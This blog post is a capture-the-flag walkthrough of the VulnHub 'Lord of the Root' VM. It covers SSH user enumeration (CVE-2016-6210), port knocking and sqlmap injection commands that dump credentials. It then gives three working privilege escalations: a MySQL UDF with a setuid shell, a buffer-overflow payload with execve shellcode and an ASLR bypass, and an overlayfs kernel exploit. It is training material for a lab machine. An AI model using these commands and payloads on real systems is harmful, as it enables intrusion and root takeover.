---
layout: post
title: "Bow before the Lord of the Root"
date: 2017-06-12 11:08:37 -0400
comments: true
categories: [penetration testing, writeups]
keywords: lord of the root, lord of the root walkthrough, lord of the root 1.0.1, lord of the root vulnhub, ctf, pentest lab
description: Lord of the Root 1.0.1 writeup
---

Back to looking through VulnHub's selection of virtual machines, I got hooked by the name of this one. The author intended for this machine to be similar in difficulty to those in the OSCP lab, so it's definitely good training if you're preparing to jump into the fray!

<!-- more -->

The port scan revealed only 1 open port:

``` 
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
```

I also ran a UDP scan, but got nothing. I proceeded to google the SSH version, and got a hit quite fast. It appears that this OpenSSH version is vulnerable to [CVE-2016-6210](https://www.ubuntu.com/usn/usn-3061-1/), which allows users to be enumerated. 

Luckily for us, there is an [exploit](https://www.exploit-db.com/exploits/40136/) available.

``` 
python 40136.py -h
usage: 40136.py [-h] [-u USER | -U USERLIST] [-e] [-s] [--bytes BYTES]
                [--samples SAMPLES] [--factor FACTOR] [--trials TRIALS]
                host

positional arguments:
  host                  Give SSH server address like ip:port or just by ip

optional arguments:
  -h, --help            show this help message and exit
  -u USER, --user USER  Give a single user name
  -U USERLIST, --userlist USERLIST
                        Give a file containing a list of users
  -e, --enumerated      Only show enumerated users
  -s, --silent          Like -e, but just the user names will be written to
                        stdout (no banner, no anything)
  --bytes BYTES         Send so many BYTES to the SSH daemon as a password
  --samples SAMPLES     Collect so many SAMPLES to calculate a timing baseline
                        for authenticating non-existing users
  --factor FACTOR       Used to compute the upper timing boundary for user
                        enumeration
  --trials TRIALS       try to authenticate user X for TRIALS times and
                        compare the mean of auth timings against the timing
                        boundary
```

So you have to give the script a username or a list of users to enumerate. Well, we already know one user! If you glanced at the LordOfTheRoot VM after it booted, you probably noticed good old smeagol:

{% img center /images/pentest/lordoftheroot/smeagol.png 'smeagol' 'smeagol' %}

Ran the script with the smeagol username:

``` 
python 40136.py -u smeagol 192.168.217.136


User name enumeration against SSH daemons affected by CVE-2016-6210
Created and coded by 0_o (nu11.nu11 [at] yahoo.com), PoC by Eddie Harari


[*] Testing SSHD at: 192.168.217.136:22, Banner: SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.3
[*] Getting baseline timing for authenticating non-existing users............
[*] Baseline mean for host 192.168.217.136 is 0.0507569 seconds.
[*] Baseline variation for host 192.168.217.136 is 0.0110011491622 seconds.
[*] Defining timing of x < 0.0837603474867 as non-existing user.
[*] Testing your users...
[+] smeagol - timing: 0.425467
```

We know there is a smeagol user on the box, but couldn't find any other exploit that might help in this situation. So I just tried SSH'ing into the box to see what happens:

``` 
ssh smeagol@192.168.217.136
The authenticity of host '192.168.217.136 (192.168.217.136)' can't be established.
ECDSA key fingerprint is SHA256:XzDLUMxo8ifHi4SciYJYj702X3PfFwaXyKOS07b6xd8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.217.136' (ECDSA) to the list of known hosts.

                                                  .____    _____________________________
                                                  |    |   \_____  \__    ___/\______   \
                                                  |    |    /   |   \|    |    |       _/
                                                  |    |___/    |    \    |    |    |   \
                                                  |_______ \_______  /____|    |____|_  /
                                                          \/       \/                 \/
 ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
|      <  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
|    |  \|   |  (  <_> )  \___|    <   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  <_> )  |        \   |  \  | \  ___/|  | \/
|____|__ \___|  /\____/ \___  >__|_ \  \___  /   |__|  |__|\___  >___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  >__|
        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
Easy as 1,2,3
smeagol@192.168.217.136's password: 
```

Woot, a banner with a hint! The knock part might reference port knocking, as I've seen that in some previous challenges. And the ports seem to be mentioned already! I used Nmap to knock on ports 1,2 and 3:

``` 
nmap -r -p1,2,3 192.168.217.136

Starting Nmap 7.40 ( https://nmap.org ) at 2017-06-12 12:31 EDT
Nmap scan report for 192.168.217.136
Host is up (0.00065s latency).
PORT  STATE    SERVICE
1/tcp filtered tcpmux
2/tcp filtered compressnet
3/tcp filtered compressnet
```

The <code>-r</code> option was necessary to scan the ports in consecutive order. After knocking, I ran the full Nmap scan again, and a web server now awaited me:

``` 
1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
```

I checked it out in the browser, and found this image:

{% img center /images/pentest/lordoftheroot/willdo.jpeg 'mordor' 'take the ring to mordor' %}

Ran exiftool and strings on the picture, didn't find anything. Next I went to the */images* directory where the image was served from, and found 2 more. Downloaded them and put them through exiftool and strings, still no results. In the meantime, I had also fired up a directory bruteforce on the server, but that didn't get me anywhere either. So the next thing I tried was to see if there is a directory called smeagol on the web server. There wasn't, but I was presented this picture, one of the 3 images found:

{% img center /images/pentest/lordoftheroot/hipster.jpg 'hipster' 'hipster' %}

Further testing confirmed that this image acted as a 404 page. But when I looked at the source, I found a suspicious string in a comment:

``` 
<!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh>
```

I put the string into a [multipurpose online decoder](https://encoder.mattiasgeniar.be/index.php) and got a base64 string out of it: <code>Lzk3ODM0NTIxMC9pbmRleC5waHA=</code>. Decoding it revealed a directory on the web server: <code>/978345210/index.php</code>. Going there, I found a login page!

{% img center /images/pentest/lordoftheroot/mordor.png 'mordor' 'mordor login' %}

Time for sqlmap! I had to play with it and tweak quite a bit, the default levels didn't report any injection vulnerability, and the scan took so long, I had to break the enumeration into manageable pieces:

``` 
sqlmap -u "http://192.168.217.136:1337/978345210/index.php" --method POST -o --level=5 --risk=3 --dbms=MySQL -p username --data="username=smeagol&password=precious&submit=+Login+" --current-db
```

First, I queried for the current DB in use. I also turned on all the optimizaton switches, raised testing levels, and started with the username parameter. And luckily, it was vulnerable:

``` 
current database:    'Webapp'
```

Next, I dumped the discovered database:

``` 
sqlmap -u "http://192.168.217.136:1337/978345210/index.php" --method POST -o --level=5 --risk=3 --dbms=MySQL -p username --data="username=smeagol&password=precious&submit=+Login+" -D Webapp --dump
[...]
Database: Webapp
Table: Users
[5 entries]
+----+----------+------------------+
| id | username | password         |
+----+----------+------------------+
| 1  | frodo    | iwilltakethering |
| 2  | smeagol  | MyPreciousR00t   |
| 3  | aragorn  | AndMySword       |
| 4  | legolas  | AndMyBow         |
| 5  | gimli    | AndMyAxe         |
+----+----------+------------------+
```

Now that I had usernames and passwords, it was time to test them on SSH! I started with smeagol, because it looked slightly different than the others :-) And I got in:

``` 
smeagol@LordOfTheRoot:~$ uname -a
Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
```

So, especially for older machines, one of the first things I do is check the kernel version. Googling it actually yielded a [privilege escalation exploit](https://www.exploit-db.com/exploits/39166/) right away. I decided to save this approach for last, because the exploit wasn't known at the time of the VM release. Instead, I proceeded to some more conventional enumeration.


I downloaded my [linux_privcheck](https://github.com/chousensha/linux_privcheck) tool with <code>wget https://raw.githubusercontent.com/chousensha/linux_privcheck/master/privinfo.py</code> and ran it on the machine while I ate a lasagna. Then I combed through the output (note to self: I have to revisit my script and make improvements to it, will get to it). The interesting tidbits that I observed were:

``` 
root      1174     1  0 08:15 ?        00:00:08 /usr/sbin/mysqld
```

MySQL running as root! Definitely on to something there, as we could get root credentials from SQLi. The other thing I found were some setuid binaries in a suspicious folder:

``` 
/SECRET/door2/file
/SECRET/door1/file
/SECRET/door3/file
```

The machine description on VulnHub stated that there are 2 methods for gaining privilege escalation..and here we are with 2 possible venues of attack! Let's take them in order!

## Privilege escalation method #1 - via MySQL

With MySQL running as root, we can use [a UDF and a setuid binary to gain a root shell](https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/). At the core of this exploit is the fact that a User Defined Function can be evaluated as SQL code to run commands in the context of the MySQL process, which is root in this case. As I was reading through the article, it became clear that root credentials would be needed for the database server. So I went back to sqlmap, and this time added the switches <code>--users</code> and <code>--passwords</code>:

``` 
database management system users [5]:
[*] 'debian-sys-maint'@'localhost'
[*] 'root'@'127.0.0.1'
[*] 'root'@'::1'
[*] 'root'@'localhost'
[*] 'root'@'lordoftheroot'

database management system users password hashes:
[*] debian-sys-maint [1]:
    password hash: *A55A9B9049F69BC2768C9284615361DFBD580B34
[*] root [1]:
    password hash: *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F
```

I used an online cracker for the root hash, and the cracked password was *darkshadow*. Then I connected to the MySQL database:

``` 
smeagol@LordOfTheRoot:~$ mysql -u root -p 
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 1829
Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```


Next, I followed the steps of the [infamoussyn article](https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/), which are really well explained. UDF files need to be [locally compiled and installed on the server host](https://dev.mysql.com/doc/refman/5.7/en/udf-compiling.html), and a special directory is required for that..

- Find the location where MySQL looks for shared object files, identified by the <code>plugin_dir</code> variable:

``` 
mysql> show variables like "plugin_dir";
+---------------+------------------------+
| Variable_name | Value                  |
+---------------+------------------------+
| plugin_dir    | /usr/lib/mysql/plugin/ |
+---------------+------------------------+
1 row in set (0.00 sec)
```

The required directory is found at <code>/usr/lib/mysql/plugin/</code>. This is where we'll put our UDF object files.

- Now it's time to compile the object file. The exploit that allows privilege escalation is called[raptor_udf2.c](https://www.exploit-db.com/exploits/1518/). I downloaded it to the compromised machine, and followed the instructions in the source code to compile it:

``` 
gcc -g -c raptor_udf2.c
```

If you are lost in the myriad of GCC options from its manpage, there is a cool page offering [options summary](https://gcc.gnu.org/onlinedocs/gcc/Option-Summary.html) in a way that lets you jump to whatever interests you. Here, I compiled the C file without linking, and with debugging information. This produced an object file called <code>raptor_udf2.o</code>. 

- Next, you create a shared library and link it:

``` 
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

If you copy from the source code, you have to change the 1 in *-W1* to a lowercase l, otherwise you get an error. Here's a [good resource](http://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html) to help you untangle the above command. Now you should also have in your directory a shared object called <code>raptor_udf2.so</code>.

- Now you create a table inside MySQL and insert the shared object contents. Switch to the mysql DB:

``` 
mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

Create table:

``` 
mysql> create table foo(line blob);
Query OK, 0 rows affected (0.03 sec)
```

Load your .so file:

``` 
mysql> insert into foo values(load_file('/home/smeagol/raptor_udf2.so'));
Query OK, 1 row affected (0.01 sec)
```

- Copy the .so file to the plugin directory:

``` 
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
Query OK, 1 row affected (0.05 sec)
```

- Now you can create the UDF:

``` 
mysql> create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected (0.00 sec)

mysql> select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+
1 row in set (0.00 sec)
```

- Confirm that it works:

``` 
mysql> select do_system('id > /tmp/out; chown smeagol.smeagol /tmp/out');
+------------------------------------------------------------+
| do_system('id > /tmp/out; chown smeagol.smeagol /tmp/out') |
+------------------------------------------------------------+
|                                                          0 |
+------------------------------------------------------------+
1 row in set (0.01 sec)

mysql> \! cat /tmp/out
uid=0(root) gid=0(root) groups=0(root)
```

Note that you can use *\\!* to run commands from within the MySQL shell.

- Finally, we want to gain a real root shell. A setuid shell is ideal for this. I placed the following C code inside a file called shell.c:

{% codeblock lang:c %}
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
setuid(0); setgid(0); system("/bin/bash");
}
{% endcodeblock %}

I used MySQL to compile it:

``` 
mysql> select do_system("gcc -o /tmp/ring /home/smeagol/shell.c");
+-----------------------------------------------------+
| do_system("gcc -o /tmp/ring /home/smeagol/shell.c") |
+-----------------------------------------------------+
|                                                   0 |
+-----------------------------------------------------+
1 row in set (0.15 sec)
```

Now set the SUID bit:

``` 
mysql> select do_system("chmod u+s /tmp/ring");
+----------------------------------+
| do_system("chmod u+s /tmp/ring") |
+----------------------------------+
|                                0 |
+----------------------------------+
1 row in set (0.01 sec)
```

I looked inside /tmp for confirmation:

``` 
smeagol@LordOfTheRoot:~$ ls -l /tmp/
total 12
-rw-rw---- 1 smeagol smeagol   39 Jun 14 04:06 out
-rwsrwx--x 1 root    root    7410 Jun 14 04:16 ring
```

Lastly, I dropped to a shell with <code>\\! sh</code>, and ran the newly created binary:

``` 
$ /tmp/ring
root@LordOfTheRoot:~# cat /root/Flag.txt 
“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
– Gandalf
```

Inside root's directory I also found source code for the binaries that will supply the second method of exploitation. And a Python script that moves them around, just like in the Tr0ll 2 challenge..

## Privilege escalation method #2 - Binary exploitation

So, I previously looked at the source code of the binaries inside the SECRET folder, and I know one of them is vulnerable to buffer overflow. Need to find which one:

``` 
smeagol@LordOfTheRoot:/SECRET$ ls -la *
door1:
total 16
drwxr-xr-x 2 root root 4096 Jun 15 08:15 .
drwxr-xr-x 5 root root 4096 Sep 22  2015 ..
-rwsr-xr-x 1 root root 7370 Sep 17  2015 file

door2:
total 16
drwxr-xr-x 2 root root 4096 Jun 15 08:15 .
drwxr-xr-x 5 root root 4096 Sep 22  2015 ..
-rwsr-xr-x 1 root root 5150 Sep 22  2015 file

door3:
total 16
drwxr-xr-x 2 root root 4096 Jun 15 08:15 .
drwxr-xr-x 5 root root 4096 Sep 22  2015 ..
-rwsr-xr-x 1 root root 7370 Sep 17  2015 file
```

Let's see each of them:

``` 
door1/file 
Syntax: door1/file <input string>
```

I went through them, and determined that the vulnerable binary is the one with size 5150.

``` 
./file $(python -c 'print "A" * 200')
Segmentation fault (core dumped)
```

I copied the binary to /tmp, so I could work on it without the interference of the moving script. Normally, it's GDB time, but I want to expand my tools coverage, and I noticed in other writeups the mention of PEDA, or [Python Exploit Development Assistance for GDB](https://github.com/longld/peda), which adds cool features and colorizes the display. So I figured I'd give it a try, and downloaded it to the target and installed it:

``` 
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```

If you want to see what PEDA can do, run <code>peda help</code> to see all available commands:

``` 
gdb-peda$ peda help
PEDA - Python Exploit Development Assistance for GDB
For latest update, check peda project page: https://github.com/longld/peda/
List of "peda" subcommands, type the subcommand to invoke it:
aslr -- Show/set ASLR setting of GDB
asmsearch -- Search for ASM instructions in memory
assemble -- On the fly assemble and execute instructions using NASM
checksec -- Check for various security options of binary
cmpmem -- Compare content of a memory region with a file
context -- Display various information of current execution context
context_code -- Display nearby disassembly at $PC of current execution context
context_register -- Display register information of current execution context
context_stack -- Display stack of current execution context
crashdump -- Display crashdump info and save to file
deactive -- Bypass a function by ignoring its execution (eg sleep/alarm)
distance -- Calculate distance between two addresses
dumpargs -- Display arguments passed to a function when stopped at a call instruction
dumpmem -- Dump content of a memory region to raw binary file
dumprop -- Dump all ROP gadgets in specific memory range
eflags -- Display/set/clear/toggle value of eflags register
elfheader -- Get headers information from debugged ELF file
elfsymbol -- Get non-debugging symbol information from an ELF file
gennop -- Generate abitrary length NOP sled using given characters
getfile -- Get exec filename of current debugged process
getpid -- Get PID of current debugged process
goto -- Continue execution at an address
help -- Print the usage manual for PEDA commands
hexdump -- Display hex/ascii dump of data in memory
hexprint -- Display hexified of data in memory
jmpcall -- Search for JMP/CALL instructions in memory
loadmem -- Load contents of a raw binary file to memory
lookup -- Search for all addresses/references to addresses which belong to a memory range
nearpc -- Disassemble instructions nearby current PC or given address
nextcall -- Step until next 'call' instruction in specific memory range
nextjmp -- Step until next 'j*' instruction in specific memory range
nxtest -- Perform real NX test to see if it is enabled/supported by OS
patch -- Patch memory start at an address with string/hexstring/int
pattern -- Generate, search, or write a cyclic pattern to memory
pattern_arg -- Set argument list with cyclic pattern
pattern_create -- Generate a cyclic pattern
pattern_env -- Set environment variable with a cyclic pattern
pattern_offset -- Search for offset of a value in cyclic pattern
pattern_patch -- Write a cyclic pattern to memory
pattern_search -- Search a cyclic pattern in registers and memory
payload -- Generate various type of ROP payload using ret2plt
pdisass -- Format output of gdb disassemble command with colors
pltbreak -- Set breakpoint at PLT functions match name regex
procinfo -- Display various info from /proc/pid/
profile -- Simple profiling to count executed instructions in the program
pyhelp -- Wrapper for python built-in help
readelf -- Get headers information from an ELF file
refsearch -- Search for all references to a value in memory ranges
reload -- Reload PEDA sources, keep current options untouch
ropgadget -- Get common ROP gadgets of binary or library
ropsearch -- Search for ROP gadgets in memory
searchmem -- Search for a pattern in memory; support regex search
session -- Save/restore a working gdb session to file as a script
set -- Set various PEDA options and other settings
sgrep -- Search for full strings contain the given pattern
shellcode -- Generate or download common shellcodes.
show -- Show various PEDA options and other settings
skeleton -- Generate python exploit code template
skipi -- Skip execution of next count instructions
snapshot -- Save/restore process's snapshot to/from file
start -- Start debugged program and stop at most convenient entry
stepuntil -- Step until a desired instruction in specific memory range
strings -- Display printable strings in memory
substr -- Search for substrings of a given string/number in memory
telescope -- Display memory content at an address with smart dereferences
tracecall -- Trace function calls made by the program
traceinst -- Trace specific instructions executed by the program
unptrace -- Disable anti-ptrace detection
utils -- Miscelaneous utilities from utils module
vmmap -- Get virtual mapping address ranges of section(s) in debugged process
waitfor -- Try to attach to new forked process; mimic "attach -waitfor"
xinfo -- Display detail information of address/registers
xormem -- XOR a memory region with a key
xprint -- Extra support to GDB's print command
xrefs -- Search for all call/data access references to a function/variable
xuntil -- Continue execution until an address or function

Type "help" followed by subcommand for full documentation.
```

It's time to run the binary! With Peda, you can create patterns just like with the Metasploit utilities:

``` 
gdb-peda$ peda help pattern
Generate, search, or write a cyclic pattern to memory
Set "pattern" option for basic/extended pattern type
Usage:
    pattern create size [file]
    pattern offset value
    pattern search
    pattern patch address size
    pattern arg size1 [size2,offset2]
    pattern env size[,offset]
gdb-peda$ pattern create 200 test
Writing pattern of 200 chars to filename "test"
```

{% img center /images/pentest/lordoftheroot/peda.png 'peda' 'segfault in peda' %}

I wanted to show a screenshot instead of the code, so you can also see the colors that make the output much more readable. You can see that EIP has been overwritten with the value 0x57414174. I searched for it in the pattern:

``` 
gdb-peda$ pattern search 0x57414174
Registers contain pattern buffer:
EBP+0 found at offset: 167
EIP+0 found at offset: 171
Registers point to pattern buffer:
[ESP] --> offset 175 - size ~25
Pattern buffer found at:
0xbffff571 : offset    0 - size  200 ($sp + -0xaf [-44 dwords])
0xbffff7f8 : offset    0 - size  200 ($sp + 0x1d8 [118 dwords])
References to pattern buffer found at:
0xbffff550 : 0xbffff571 ($sp + -0xd0 [-52 dwords])
0xbffff560 : 0xbffff571 ($sp + -0xc0 [-48 dwords])
0xbffff564 : 0xbffff7f8 ($sp + -0xbc [-47 dwords])
0xbffff6b8 : 0xbffff7f8 ($sp + 0x98 [38 dwords])
```

The reported offset is 171. Verified it really quick:

``` 
gdb-peda$ r $(python -c 'print "A" * 171 + "B" * 4 + "C" * 4')
[...]
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff640 ("CCCC")
EIP: 0x42424242 ('BBBB')
```

Alright, now we need some shellcode. I decided to use Peda for all the exploitation phases, so I could showcase more of its functionality. First, I looked at the options:

``` 
gdb-peda$ peda help shellcode
Generate or download common shellcodes.
Usage:
    shellcode generate [arch/]platform type [port] [host]
    shellcode search keyword (use % for any character wildcard)
    shellcode display shellcodeId (shellcodeId as appears in search results)
    shellcode zsc [generate customize shellcode]

    For generate option:
        default port for bindport shellcode: 16706 (0x4142)
        default host/port for connect back shellcode: 127.127.127.127/16706
        supported arch: x86
```

Next I searched for some execve shellcode, and settled for the below:

``` 
[841]	Linux/x86 - Tiny Execve sh Shellcode - 21 bytes
```

Let's see what I got here:

``` 
gdb-peda$ shellcode display 841
Connecting to shell-storm.org...

/*

 Tiny Execve sh Shellcode - C Language - Linux/x86
 Copyright (C) 2013 Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <http://www.gnu.org/licenses/>

*/

/*

   tiny_execve_sh_shellcode

  * 21 bytes
  * null-free


   # gcc -m32 -fno-stack-protector -z execstack tiny_execve_sh_shellcode.c -o tiny_execve_sh_shellcode

   Testing
   # ./tiny_execve_sh_shellcode

*/


#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \

"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f"
"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd"
"\x80";


main ()
{

        // When contains null bytes, printf will show a wrong shellcode length.

	printf("Shellcode Length:  %d\n", strlen(shellcode));

	// Pollutes all registers ensuring that the shellcode runs in any circumstance.

	__asm__ ("movl $0xffffffff, %eax\n\t"
		 "movl %eax, %ebx\n\t"
		 "movl %eax, %ecx\n\t"
		 "movl %eax, %edx\n\t"
		 "movl %eax, %esi\n\t"
		 "movl %eax, %edi\n\t"
		 "movl %eax, %ebp\n\t"

		 // Calling the shellcode
		 "call shellcode");

}
```

Ok, the shellcode is <code>\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80</code>. Next we need the address of ESP, so we know where to store our shellcode. Then we can have a full payload, where we point EIP to the contents of ESP, and the shellcode gets executed.

``` 
gdb-peda$ context stack

[------------------------------------stack-------------------------------------]
0000| 0xbffff640 ("CCCC")
0004| 0xbffff644 --> 0xbffff600 ('A' <repeats 60 times>, "BBBBCCCC")
0008| 0xbffff648 --> 0xbffff6e0 --> 0xbffff8c1 ("XDG_SESSION_ID=1")
0012| 0xbffff64c --> 0xb7feccea (<call_init+26>:	add    ebx,0x12316)
0016| 0xbffff650 --> 0x2 
0020| 0xbffff654 --> 0xbffff6d4 --> 0xbffff803 ("/tmp/file")
0024| 0xbffff658 --> 0xbffff674 --> 0x658f7063 
0028| 0xbffff65c --> 0x804974c --> 0xb7e2f990 (<__libc_start_main>:	push   ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
```

So ESP is located at 0xbffff640. Or so I thought..when I ran my payload, I got another segfault and the address of ESP was different. I didn't expect something like ASLR to be enabled, but when I checked, it actually is:

``` 
cat /proc/sys/kernel/randomize_va_space
2
```

I checked with *ldd*:

``` 
smeagol@LordOfTheRoot:/tmp$ ldd file 
	linux-gate.so.1 =>  (0xb773d000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7576000)
	/lib/ld-linux.so.2 (0xb773f000)
smeagol@LordOfTheRoot:/tmp$ ldd file 
	linux-gate.so.1 =>  (0xb770c000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7545000)
	/lib/ld-linux.so.2 (0xb770e000)
```

After some googling, I found a [trick to disable ASLR](https://www.exploit-db.com/exploits/39669/). On a vulnerable 32 bit system, ASLR doesn't always randomize the mmap base address when the stack size is set to unlimited. I verified that it works:

``` 
smeagol@LordOfTheRoot:/tmp$ ulimit -s unlimited
smeagol@LordOfTheRoot:/tmp$ ldd file 
	linux-gate.so.1 =>  (0x40024000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x4003d000)
	/lib/ld-linux.so.2 (0x40000000)
smeagol@LordOfTheRoot:/tmp$ ldd file 
	linux-gate.so.1 =>  (0x40024000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x4003d000)
	/lib/ld-linux.so.2 (0x40000000)
```


I tweaked the exploit again, but I still couldn't hit on a valid ESP address. In the end, I used Peda to help me locate a *jmp esp* address:

``` 
gdb-peda$ jmpcall esp
Not found
gdb-peda$ jmpcall esp libc
0x4003ea85 : jmp esp
```

Adjusted the exploit again, and it worked:

``` 
gdb-peda$ r $(python -c 'print "A" * 171 + "\x85\xea\x03\x40" + "\x90" * 2000 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
Starting program: /tmp/file $(python -c 'print "A" * 171 + "\x85\xea\x03\x40" + "\x90" * 2000 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
process 5184 is executing new program: /bin/dash
$ whoami
[New process 5187]
process 5187 is executing new program: /usr/bin/whoami
smeagol
$ [Inferior 2 (process 5187) exited normally]
Warning: not running or target is remote
```

To gain root, we need to exploit the real suid binary:

``` 
smeagol@LordOfTheRoot:/SECRET/door2$ ./file $(python -c 'print "A" * 171 + "\x85\xea\x03\x40" + "\x90" * 2000 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
# whoami
root
```

## Privilege escalation method #3 - kernel exploit

Lastly, we're back to the [overlayfs exploit](https://www.exploit-db.com/exploits/39166). It's just a matter of download, compile, run:

``` 
smeagol@LordOfTheRoot:/tmp$ ./overlay 
root@LordOfTheRoot:/tmp# whoami
root
```

We owned Mordor! This was such an interesting challenge, learned many new things! Thanks to KookSec for this!

#### Learn more

- [ASLR bypassing](https://www.exploit-db.com/papers/13030/)

- [Linux Interactive Exploit Development with GDB and PEDA](http://ropshell.com/peda/Linux_Interactive_Exploit_Development_with_GDB_and_PEDA_Slides.pdf)

- [disable ASLR trick](https://www.exploit-db.com/exploits/39669/)


Will leave you with this:

{% img center /images/pentest/lordoftheroot/legolas.jpg 'legolas' 'legolas' %}
